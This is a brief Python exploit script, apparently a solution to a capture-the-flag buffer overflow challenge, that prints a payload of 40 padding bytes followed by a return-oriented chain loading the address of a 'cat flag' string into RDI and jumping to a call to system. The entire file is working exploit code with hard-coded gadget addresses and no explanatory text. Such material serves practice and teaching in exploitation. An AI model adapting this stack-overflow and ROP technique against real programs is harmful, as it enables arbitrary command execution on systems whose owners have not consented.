#!/usr/bin/python3

import sys

POP_RDI = 0x4007c3
CALL_SYSTEM = 0x40074b

CAT_FLAG_STR = 0x601060

def write_ints(dat):
    for v in dat:
        sys.stdout.buffer.write(v.to_bytes(8, byteorder="little"))

def write_call(addr):
    write_ints([addr])

def write_offset():
    sys.stdout.buffer.write(b'A'*40)

write_offset()

write_call(POP_RDI)
write_ints([CAT_FLAG_STR])

write_call(CALL_SYSTEM)
